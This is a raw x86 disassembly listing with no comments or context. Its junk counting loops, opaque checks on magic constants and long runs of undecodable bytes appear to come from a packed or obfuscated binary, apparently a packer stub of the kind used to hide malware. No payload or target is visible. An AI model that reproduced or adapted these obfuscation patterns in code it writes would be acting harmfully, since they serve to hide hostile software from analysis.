  40187a:	and    DWORD PTR ds:0x4303e3,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x4303e3
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x4303e3,esi
  401898:	cmp    DWORD PTR ds:0x4303e3,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x4303e3,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e8ab
  4018bd:	cmp    DWORD PTR ds:0x4303e3,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x4303e3
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x4303e3,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ecd7
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ecdb,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ecdb
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ecdb,esi
  4018fe:	cmp    DWORD PTR ds:0x42ecdb,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42eb0f
  401914:	cmp    DWORD PTR ds:0x42ecdb,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ecdb
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ecdb,esi
  40192e:	cmp    DWORD PTR ds:0x42ecdb,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42eccb,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x4303db,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x4303db
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x4303db,esi
  401966:	cmp    DWORD PTR ds:0x4303db,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x4303db,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e7b7
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42e997
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x43033d
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x430335,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x430335
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x430335,ebx
  4019c4:	cmp    DWORD PTR ds:0x430335,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e845
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e8bb
  4019e5:	cmp    DWORD PTR ds:0x430335,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x5ab1d3f2
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a46
  401a76:	not    BYTE PTR [edx-0x63]
  401a79:	mov    edx,0x403883
  401a7e:	btc    DWORD PTR [edi-0x75],ecx
  401a82:	mov    ebx,0xa5324ccc
  401a87:	dec    ecx
  401a88:	pop    edx
  401a89:	(bad)  
  401a8a:	mov    ch,0xa7
  401a8c:	and    eax,0xe12e74b9
  401a91:	adc    DWORD PTR [ebp-0x137aced4],ebp
  401a97:	push   ss
  401a98:	xor    eax,ebp
  401a9a:	repz clc 
  401a9c:	cdq    
  401a9d:	xor    esp,DWORD PTR es:[edx+ecx*4]
  401aa1:	sahf   
  401aa2:	dec    ecx
  401aa3:	imul   ecx,DWORD PTR [ecx-0x26],0x566ffacd
  401aaa:	mov    bl,0x22
  401aac:	mov    al,0xba
  401aae:	inc    edi
  401aaf:	out    dx,eax
  401ab0:	jmp    0xe1e22697
  401ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ab6:	xchg   BYTE PTR [eax+0x5e],ch
  401ab9:	dec    edi
  401aba:	in     al,0xc
  401abc:	mov    eax,ds:0x4a2c01d
  401ac1:	out    dx,al
  401ac2:	mov    al,ds:0x76787f85
  401ac7:	cmp    edx,DWORD PTR [ebp+0x7da6c55b]
  401acd:	or     BYTE PTR ds:0xb9e840bd,bl
  401ad3:	xchg   edx,eax
  401ad4:	cld    
  401ad5:	inc    ebx
  401ad6:	(bad)  
  401ad7:	jb     0x401b31
  401ad9:	fst    st(1)
  401adb:	or     DWORD PTR [ebp-0x64],edx
  401ade:	xor    edi,DWORD PTR [esi+0x3cd81695]
  401ae4:	pop    esp
  401ae5:	push   ebx
  401ae6:	(bad)  
  401ae8:	int3   
  401ae9:	or     DWORD PTR [edi-0x1f60b63b],ecx
  401aef:	int    0xad
  401af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401af2:	cmp    BYTE PTR [ebp+0x33],dh
  401af5:	int3   
  401af6:	cmp    DWORD PTR [eax-0x21ab52f1],ecx
  401afc:	xor    BYTE PTR [ebx+0x51],0xb4
  401b00:	inc    edi
  401b01:	mov    dl,0x64
  401b03:	cmp    DWORD PTR [eax-0x7e4fc4c0],edi
  401b09:	sti    
  401b0a:	add    eax,DWORD PTR [esi]
  401b0c:	push   edi
  401b0d:	mov    eax,0x704a48c1
  401b12:	in     eax,0xb1
  401b14:	sbb    cl,BYTE PTR [edx]
  401b16:	shl    ecx,cl
  401b18:	rol    BYTE PTR [ebp+0x45],cl
  401b1b:	fdivrp st(6),st
  401b1d:	stc    
  401b1e:	imul   ecx,ebp,0xcf0f7140
  401b24:	and    al,0x70
  401b26:	imul   esi,DWORD PTR [ebx-0x6b],0xfffffffa
  401b2a:	xor    DWORD PTR [ebx-0x3fd3996f],0x4ae3ecb2
  401b34:	sub    al,0xc3
  401b36:	loopne 0x401b00
  401b38:	mov    ebp,0xbd7596bf
  401b3d:	(bad)  
  401b3e:	pop    eax
  401b3f:	and    cl,0x55
  401b42:	je     0x401b90
  401b44:	ret    0x38df
  401b47:	or     eax,0x85a31529
  401b4c:	cli    
  401b4d:	sbb    BYTE PTR [eax+0x746ee4e1],0xd0
  401b54:	fprem1 
  401b56:	cld    
  401b57:	rcr    BYTE PTR [eax+0x1cc639b],1
  401b5d:	adc    edi,DWORD PTR [ebp+0x5d]
  401b60:	pop    eax
  401b61:	mov    ah,0x5
  401b63:	pop    edx
  401b64:	fmul   st(4),st
  401b66:	retf   0xf9d5
  401b69:	mov    ecx,0x9c175a08
  401b6e:	pop    ecx
  401b6f:	or     al,0x6b
  401b71:	or     esi,ecx
  401b73:	pop    ds
  401b74:	popa   
  401b75:	cs push edi
  401b77:	sar    BYTE PTR [edi-0x3dc54a03],1
  401b7d:	mov    ebx,0xd66a5e31
  401b82:	or     bl,BYTE PTR [ebp+0x53ac9c70]
  401b88:	adc    al,BYTE PTR [edi+0x43f84b47]
  401b8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b8f:	push   ebp
  401b90:	or     bl,BYTE PTR [ecx+0x6f104254]
  401b96:	cmovnp ecx,DWORD PTR [eax+edi*4-0x4071958a]
  401b9e:	call   0xd76a:0x922278f
  401ba5:	mov    edi,0x70100fbc
  401baa:	lods   eax,DWORD PTR ds:[esi]
  401bab:	push   esp
  401bac:	sub    BYTE PTR [esi],dl
  401bae:	repnz loope 0x401bdc
  401bb1:	popf   
  401bb2:	lods   eax,DWORD PTR ds:[esi]
  401bb3:	push   es
  401bb4:	stos   DWORD PTR es:[edi],eax
  401bb5:	test   esi,ebp
  401bb7:	sbb    eax,0x1bc15534
  401bbc:	arpl   WORD PTR [esi],dx
  401bbe:	jo     0x401be0
  401bc0:	push   edi
  401bc1:	int3   
  401bc2:	int    0x47
  401bc4:	add    dh,BYTE PTR [edi]
  401bc6:	in     eax,dx
  401bc7:	or     ebx,eax
  401bc9:	imul   edi,DWORD PTR [eax+0x3b],0xffffff8b
  401bcd:	aaa    
  401bce:	in     al,dx
  401bcf:	cli    
  401bd0:	cmp    eax,0x2c34e26e
  401bd5:	js     0x401be0
  401bd7:	xchg   DWORD PTR [ebx-0x6e],ecx
  401bda:	mov    ah,0xda
  401bdc:	push   DWORD PTR [ecx+0x790c3c89]
  401be2:	in     eax,dx
  401be3:	dec    eax
  401be4:	inc    eax
  401be5:	sbb    al,0x52
  401be7:	jp     0x401bf4
  401be9:	xor    al,0x28
  401beb:	sub    BYTE PTR [edx],0x4c
  401bee:	mov    ah,0x61
  401bf0:	std    
  401bf1:	aam    0x70
  401bf3:	push   cs
  401bf4:	pop    ecx
  401bf5:	adc    al,0xbd
  401bf7:	sub    DWORD PTR [ebx+0x12],ebp
  401bfa:	add    BYTE PTR [ecx+0x0],ah
  401bfd:	mov    ch,0x45
  401bff:	pop    ss
  401c00:	dec    edi
  401c01:	mov    WORD PTR [ebx-0x6e9b1c32],ss
  401c07:	hlt    
  401c08:	add    al,0x90
  401c0a:	inc    edx
  401c0b:	dec    ebx
  401c0c:	jo     0x401b9e
  401c0e:	push   ds
  401c0f:	shl    DWORD PTR [esi],0xed
  401c12:	jbe    0x401c39
  401c14:	std    
  401c15:	sub    ebx,DWORD PTR [esi]
  401c17:	sbb    BYTE PTR [edx+0x458da404],bl
  401c1d:	hlt    
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	rsm    
  401c92:	retf   
  401c93:	jo     0x401cc5
  401c95:	push   es
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401cf8
  401c9d:	ret    0x88d2
  401ca0:	fild   QWORD PTR [edx+0x3d4d9ad9]
  401ca6:	cmp    eax,0x7b837632
  401cab:	call   0x5e30:0xdb5add18
  401cb2:	jnp    0x401d22
  401cb4:	les    esp,FWORD PTR [edx-0x200bf379]
  401cba:	aas    
  401cbb:	jle    0x401cc5
  401cbd:	stc    
  401cbe:	je     0x401d36
  401cc0:	sbb    eax,0xcc0c1c1d
  401cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cc6:	fbld   TBYTE PTR [edx]
  401cc8:	inc    ebx
  401cc9:	fdivp  st(6),st
  401ccb:	std    
  401ccc:	add    ah,BYTE PTR [eax+ecx*2-0x234ab603]
  401cd3:	enter  0x1121,0x5c
  401cd7:	jp     0x401ccb
  401cd9:	dec    edx
  401cda:	aaa    
  401cdb:	cmp    al,0xf9
  401cdd:	(bad)  
  401cdf:	xor    BYTE PTR [esi-0x57b9edb],bh
  401ce5:	shl    BYTE PTR [eax-0xc],cl
  401ce8:	cmp    eax,0xd3a82fe1
  401ced:	ins    BYTE PTR es:[edi],dx
  401cee:	fst    DWORD PTR [esp+ebp*1+0x7a]
  401cf2:	add    edi,eax
  401cf4:	std    
  401cf5:	add    DWORD PTR [edi-0x5b1294c1],ebx
  401cfb:	adc    DWORD PTR ds:0xee39e900,0x36
  401d02:	and    BYTE PTR [ecx+esi*8+0x2d],bl
  401d06:	les    edi,FWORD PTR [esi]
  401d08:	push   ss
  401d09:	ds ins BYTE PTR es:[edi],dx
  401d0b:	dec    eax
  401d0c:	call   0xb253a557
  401d11:	lea    edx,[ebx-0x3d]
  401d14:	or     BYTE PTR [eax+0x2e],0x70
  401d18:	ins    DWORD PTR es:[edi],dx
  401d19:	mov    bh,al
  401d1b:	mov    al,ds:0x4e87ea29
  401d20:	mov    ebx,0x901531e3
  401d25:	add    edx,edx
  401d27:	(bad)  
  401d29:	aam    0x86
  401d2b:	das    
  401d2c:	jle    0x401ccb
  401d2e:	je     0x401cf3
  401d30:	es mov ch,0x11
  401d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d34:	lods   eax,DWORD PTR ds:[esi]
  401d35:	fisubr DWORD PTR [ebx-0x68]
  401d38:	add    al,0x6d
  401d3a:	push   ebx
  401d3b:	add    dh,al
  401d3d:	inc    eax
  401d3e:	sbb    dh,ch
  401d40:	shr    BYTE PTR [esi-0x7e],1
  401d43:	push   esi
  401d44:	cmp    al,0x76
  401d46:	fiadd  DWORD PTR [edi]
  401d48:	and    DWORD PTR ds:0xb9b105b3,eax
  401d4e:	aad    0x8b
  401d50:	fiadd  WORD PTR [edi]
  401d52:	xchg   edx,eax
  401d53:	xchg   BYTE PTR [edx+0x1a],cl
  401d56:	hlt    
  401d57:	outs   dx,BYTE PTR ds:[esi]
  401d58:	or     BYTE PTR [edi+esi*4+0x4fd89518],ah
  401d5f:	jl     0x401d11
  401d61:	xchg   DWORD PTR [esi],ebx
  401d63:	xchg   BYTE PTR [edi+0x5b],bl
  401d66:	push   esp
  401d67:	ds scas eax,DWORD PTR es:[edi]
  401d69:	cmp    eax,0x3e8467b9
  401d6e:	addr16 jnp 0x401d03
  401d71:	sub    al,0xae
  401d73:	jns    0x401da6
  401d75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d76:	lods   eax,DWORD PTR ds:[esi]
  401d77:	jo     0x401d75
  401d79:	push   edi
  401d7a:	mov    eax,0x981b1b72
  401d7f:	mov    ebp,0xdc149a5f
  401d84:	add    DWORD PTR [ebx+0x2941d0b1],ecx
  401d8a:	loop   0x401d0c
  401d8c:	or     al,0x79
  401d8e:	imul   ecx,DWORD PTR [esi+edi*4],0xffffff91
  401d92:	pop    esi
  401d93:	jg     0x401d29
  401d95:	mov    ?,WORD PTR [eax]
  401d97:	jp     0x401d5b
  401d99:	mov    bh,0x4f
  401d9b:	mov    ah,0xa
  401d9d:	sub    ebp,ebp
  401d9f:	and    ebp,edx
  401da1:	jmp    DWORD PTR [edx]
  401da3:	inc    si
  401da5:	sbb    BYTE PTR [esi],dh
  401da7:	lock aam 0xae
  401daa:	aad    0xb7
  401dac:	jge    0x401e1e
  401dae:	(bad)  
  401daf:	addr16 retf 
  401db1:	and    edi,DWORD PTR [esp+esi*2+0x7f]
  401db5:	mov    bh,0x5f
  401db7:	mov    ecx,0x22670c8
  401dbc:	xchg   edi,eax
  401dbd:	add    BYTE PTR [ebp+0x70],bl
  401dc0:	scas   eax,DWORD PTR es:[edi]
  401dc1:	pushf  
  401dc2:	push   eax
  401dc3:	inc    esi
  401dc4:	loopne 0x401d62
  401dc6:	pop    ds
  401dc7:	add    eax,0x425e5c6c
  401dcc:	xchg   ebp,eax
  401dcd:	mov    cs,WORD PTR [ebp+0x7b]
  401dd0:	cs jl  0x401d59
  401dd3:	sub    eax,0x34118bc3
  401dd8:	aas    
  401dd9:	cmp    BYTE PTR [edi],dh
  401ddb:	aaa    
  401ddc:	inc    ebp
  401ddd:	fwait
  401dde:	fwait
  401ddf:	inc    ecx
  401de0:	push   ecx
  401de1:	out    dx,eax
  401de2:	pop    ds
  401de3:	xchg   ebp,eax
  401de4:	leave  
  401de5:	loop   0x401e40
  401de7:	inc    ecx
  401de8:	not    DWORD PTR [esi]
  401dea:	jmp    FWORD PTR [eax]
  401dec:	jmp    0x1fb6:0x643596a9
  401df3:	imul   ebp,DWORD PTR ds:0xa244be81,0x17
  401dfa:	sub    ah,0xf3
  401dfd:	jl     0x401e3d
  401dff:	cmc    
  401e00:	shl    BYTE PTR [edx+0xb],cl
  401e03:	add    al,0x90
  401e05:	or     eax,0xa5566cd0
  401e0a:	test   al,0x40
  401e0c:	out    dx,eax
  401e0d:	fld    QWORD PTR [edi+esi*8]
  401e10:	jne    0x401e70
  401e12:	outs   dx,BYTE PTR ds:[esi]
  401e13:	cdq    
  401e14:	rol    BYTE PTR [edx+0x31],0xe7
  401e18:	jno    0x401e80
  401e1a:	adc    DWORD PTR [ebp-0x18],esp
  401e1d:	hlt    
  401e1e:	mov    esp,0xbd81a4d
  401e23:	enter  0x19ee,0x1e
  401e27:	mov    bl,0x99
  401e29:	mul    DWORD PTR [ebp-0x77]
  401e2c:	mov    BYTE PTR [eax],ch
  401e2e:	cmp    ebx,DWORD PTR [ebx-0x4c9873f9]
  401e34:	push   ebp
  401e35:	in     eax,0x32
  401e37:	mov    esp,0x869b7390
  401e3c:	xchg   edi,eax
  401e3d:	arpl   sp,cx
  401e3f:	or     BYTE PTR [esi],ah
  401e41:	icebp  
  401e42:	xor    DWORD PTR [eax],0x2650fa8f
  401e48:	jmp    0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	mov    eax,0x5a8039e1
  401e85:	pop    es
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e19
  401e8d:	jnp    0x401e8d
  401e8f:	cmp    al,0x57
  401e91:	push   esp
  401e92:	or     DWORD PTR [edi+0x23143c87],ecx
  401e98:	lods   eax,DWORD PTR cs:[esi]
  401e9a:	push   es
  401e9b:	mov    ebp,esp
  401e9d:	dec    ebp
  401e9e:	and    BYTE PTR [ecx+edx*2],al
  401ea1:	cmp    al,0x5b
  401ea3:	aam    0x62
  401ea5:	pusha  
  401ea6:	smsw   WORD PTR [edi+0x26]
  401eaa:	mov    ebx,eax
  401eac:	jns    0x401e7e
  401eae:	or     ah,BYTE PTR [eax]
  401eb0:	scas   al,BYTE PTR es:[edi]
  401eb1:	mov    dh,0x8c
  401eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eb4:	into   
  401eb5:	push   ebp
  401eb6:	mov    WORD PTR [eax],gs
  401eb8:	sub    eax,DWORD PTR [edi]
  401eba:	xchg   edx,eax
  401ebb:	sbb    esp,DWORD PTR [edx-0x65c7a430]
  401ec1:	loope  0x401ee1
  401ec3:	mov    al,ds:0x7bf54845
  401ec8:	push   esp
  401ec9:	jae    0x401f11
  401ecb:	push   esi
  401ecc:	inc    ecx
  401ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ece:	icebp  
  401ecf:	call   0x4919401a
  401ed4:	adc    BYTE PTR [edx+0x46],bh
  401ed7:	lds    ebp,FWORD PTR [eax+0x3d34a81]
  401edd:	push   ebx
  401ede:	cmc    
  401edf:	enter  0x4daf,0x38
  401ee3:	fimul  DWORD PTR [ecx-0x58c11f9]
  401ee9:	dec    esi
  401eea:	xor    BYTE PTR [ecx-0x6df0765f],ah
  401ef0:	sub    al,0x98
  401ef2:	xor    eax,edi
  401ef4:	lods   al,BYTE PTR ds:[esi]
  401ef5:	jmp    FWORD PTR [ebx-0x1a53894b]
  401efb:	push   0x2c8c8d81
  401f00:	mov    eax,0x3a6ac052
  401f05:	xchg   edi,eax
  401f06:	div    bh
  401f08:	pop    ds
  401f09:	fisttp DWORD PTR [esi]
  401f0b:	inc    edx
  401f0c:	rcr    edi,1
  401f0e:	xchg   ebp,eax
  401f0f:	add    eax,DWORD PTR ds:0x5430c355
  401f15:	push   ds
  401f16:	push   edi
  401f17:	ret    
  401f18:	xor    DWORD PTR [edi-0x35fdc713],esi
  401f1e:	call   0x5ef4c81
  401f23:	int3   
  401f24:	push   edx
  401f25:	pop    es
  401f26:	add    eax,0xee658e4b
  401f2b:	inc    edi
  401f2c:	adc    eax,0x4b057347
  401f31:	in     eax,0xb6
  401f33:	nop
  401f34:	emms   
  401f36:	adc    ah,BYTE PTR [edx+0x6b]
  401f39:	cmp    BYTE PTR [edx],cl
  401f3b:	mov    BYTE PTR [eax-0x32],dh
  401f3e:	or     esi,0x7925b0f9
  401f44:	repnz daa 
  401f46:	mov    ax,ds:0x935fb355
  401f4c:	in     eax,0xfe
  401f4e:	fs jno 0x401f15
  401f51:	jmp    0x96e3baf
  401f56:	add    BYTE PTR [ecx-0x4f673a18],ah
  401f5c:	adc    BYTE PTR [esi+0x74],bh
  401f5f:	shr    ecx,cl
  401f61:	xchg   esi,eax
  401f62:	cmp    ebx,ebx
  401f64:	scas   al,BYTE PTR es:[edi]
  401f65:	mov    esi,0xa024dbfa
  401f6a:	jb     0x401ef9
  401f6c:	out    dx,al
  401f6d:	pop    eax
  401f6e:	push   ds
  401f6f:	jb     0x401f69
  401f71:	dec    eax
  401f72:	aam    0x21
  401f74:	popa   
  401f75:	xor    DWORD PTR [ecx+0x3],esi
  401f78:	pop    ds
  401f79:	or     eax,0x8dd12d9c
  401f7e:	shl    BYTE PTR [eax-0xf],0xfa
  401f82:	inc    eax
  401f83:	ins    BYTE PTR es:[edi],dx
  401f84:	sub    al,0x50
  401f86:	ret    
  401f87:	inc    esp
  401f88:	xchg   BYTE PTR [edx+0x3d87b3a0],ah
  401f8e:	jae    0x401fc1
  401f90:	or     BYTE PTR [esi+0x4a],bl
  401f93:	xchg   DWORD PTR [ebx+edx*8],edx
  401f96:	(bad)  
  401f98:	or     DWORD PTR [edx-0x50],ecx
  401f9b:	xchg   edx,eax
  401f9c:	dec    esp
  401f9d:	popf   
  401f9e:	retf   0x6867
  401fa1:	lock inc ebx
  401fa3:	fsubr  QWORD PTR [ecx-0x6d6e227]
  401fa9:	arpl   cx,si
  401fab:	push   eax
  401fac:	jmp    0x401ffd
  401fae:	push   ebp
  401faf:	cs popf 
  401fb1:	fisttp WORD PTR [esi+0x52d1320d]
  401fb7:	add    ecx,eax
  401fb9:	sbb    bh,BYTE PTR [ebx+0xefc9f47]
  401fbf:	ret    0xbef6
  401fc2:	pusha  
  401fc3:	xchg   ebp,eax
  401fc4:	xchg   edi,eax
  401fc5:	mov    ch,0xb8
  401fc7:	inc    eax
  401fc8:	fidiv  WORD PTR [edx-0x71d3b8bd]
  401fce:	cmp    bl,bh
  401fd0:	push   ss
  401fd1:	pop    edx
  401fd2:	and    al,0xd6
  401fd4:	stos   BYTE PTR es:[edi],al
  401fd5:	bound  eax,QWORD PTR [si]
  401fd8:	xchg   ebp,eax
  401fd9:	xlat   BYTE PTR ds:[ebx]
  401fda:	or     al,0x44
  401fdd:	push   eax
  401fde:	fbld   TBYTE PTR [ebx+0x3a38283]
  401fe4:	adc    DWORD PTR [ebx+0x2c],esp
  401fe7:	cmp    dl,BYTE PTR [edi+ecx*1+0xf407cf4]
  401fee:	mov    ebp,0x83565c7f
  401ff3:	mov    esi,?
  401ff5:	cdq    
  401ff6:	idiv   BYTE PTR [eax]
  401ff8:	cmc    
  401ff9:	and    DWORD PTR [esi-0x12],ebx
  401ffc:	cli    
  401ffd:	pop    ebp
  401ffe:	fild   DWORD PTR [edi-0x34037a08]
  402004:	mov    WORD PTR [esi-0x61],es
  402007:	sbb    ecx,DWORD PTR [ebx-0x24cc510e]
  40200d:	pop    edi
  40200e:	mov    bh,0x1b
  402010:	mov    ah,0xbc
  402012:	jb     0x401fa6
  402014:	jno    0x40207c
  402016:	outs   dx,BYTE PTR ds:[esi]
  402017:	or     eax,0xf566ced5
  40201c:	inc    edx
  40201d:	js     0x402045
  40201f:	test   al,0x9e
  402022:	inc    eax
  402023:	repnz cmp ch,al
  402026:	lock mov DWORD PTR [edx],ebp
  402029:	call   0x6eeb:0xa58a1ea7
  402030:	imul   ebx,DWORD PTR [edi],0x4589c603
  402036:	ror    BYTE PTR [ebx-0x749933bb],1
  40203c:	push   ebp
  40203d:	enter  0x3cbb,0x8a
  402041:	add    BYTE PTR [eax],al
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	out    dx,eax
  4020e5:	ret    0x814c
  4020e8:	test   BYTE PTR ds:0x7f557e7e,al
  4020ee:	jle    0x40216e
  4020f0:	push   esi
  4020f1:	mov    WORD PTR [eax-0x15],?
  4020f4:	nop
  4020f5:	(bad)  
  4020f6:	repz fdiv DWORD PTR [eax-0x71]
  4020fa:	outs   dx,BYTE PTR ds:[esi]
  4020fb:	ins    DWORD PTR es:[edi],dx
  4020fc:	adc    sp,WORD PTR [esi+0x15]
  402100:	fcom   DWORD PTR [esp+esi*1]
  402103:	ja     0x4020be
  402105:	and    al,cl
  402107:	mov    dh,BYTE PTR [ebp+eiz*4-0x383cd971]
  40210e:	pop    es
  40210f:	fwait
  402110:	pop    ecx
  402111:	in     al,dx
  402112:	push   ds
  402113:	div    BYTE PTR [ecx+0x30eb12db]
  402119:	push   eax
  40211a:	dec    ebx
  40211b:	pop    edi
  40211c:	fwait
